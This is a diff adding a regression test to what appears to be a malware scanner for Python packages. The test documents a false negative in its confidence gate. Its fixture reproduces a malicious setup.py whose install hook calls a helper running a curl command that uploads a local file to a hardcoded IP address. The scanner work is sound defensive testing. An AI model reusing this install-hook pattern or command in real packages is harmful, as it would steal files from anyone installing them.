@@ -1248,3 +1248,47 @@ setup(name="fastapi-azure-b2c", version="0.1.0")
 """
     report = inspect_python_code_ast(malicious_code, "setup.py")
     assert report.verdict == ThreatVerdict.MALICIOUS
+
+
+def test_install_hook_existence_not_run_through_confidence_gate():
+    """
+    Regression for a real false-negative found 2026-09-06 via the network
+    golden-malware-corpus test (`-m corpus`), which is NOT part of the
+    default suite this repeats offline: an earlier version of the
+    confidence gate ran "a custom setup.py install/cmdclass override
+    exists" (Exec_Python_Setup_Hook + SupplyChain_PyPI_Custom_Install_Command,
+    both MEDIUM) through the same Bayesian combination used for
+    CROSS_ECOSYSTEM_WORM_PROPAGATION, demoting 4 of 10 confirmed-malicious
+    DataDog corpus samples (0wneg, a1rn, activedevbadge, adanbu) to
+    UNVERIFIED_HIGH_SIGNAL — because those two rules fire identically on
+    real malware and on real legitimate packages (`daff`,
+    `orange-widget-base`), and the combined-probability math even ranked
+    the legitimate package's evidence higher than the real malware's (its
+    actual os.system-to-hardcoded-IP call was hidden inside a helper
+    function the AST visitor doesn't trace into). Recall matters more than
+    precision here, so install-hook detection is trusted unconditionally,
+    same as before the confidence framework existed — this fixture is the
+    real a1rn pattern (dangerous call inside a helper invoked from run(),
+    not written directly inside it), reduced to the minimum shape.
+    """
+    real_malware_shape = """
+import os
+from setuptools.command.install import install
+import setuptools
+
+def custom_function():
+    os.system('curl -F a=@/flag 114.115.142.57:10113')
+
+class CustomInstallCommand(install):
+    def run(self):
+        custom_function()
+        install.run(self)
+
+setuptools.setup(
+    name='a1rn',
+    version='0.1.4',
+    cmdclass={'install': CustomInstallCommand},
+)
+"""
+    report = inspect_python_code_ast(real_malware_shape, "setup.py")
+    assert report.verdict == ThreatVerdict.MALICIOUS
